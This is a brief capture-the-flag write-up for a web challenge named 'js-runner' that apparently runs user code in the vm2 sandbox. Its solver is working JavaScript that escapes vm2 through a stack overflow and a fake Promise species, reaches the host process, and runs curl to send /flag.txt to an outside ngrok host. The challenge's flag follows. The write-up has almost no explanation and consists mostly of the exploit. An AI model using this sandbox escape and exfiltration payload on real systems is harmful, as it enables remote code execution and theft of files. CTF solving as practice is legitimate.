# [web] - [js-runner]

## Author
nyxmare

## Description
Hey, I made a sandbox app, can you hack it

## Overview & Solution

- vm2

### Solver

```js
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('curl http://0.tcp.ap.ngrok.io:16334 --data @/flag.txt'); }
            )
        }
    }
};
p.then();
```


## Flag
`CJ{OH_HEY_YOU_JUST_HACKED_THE_JS_RUNNER}`
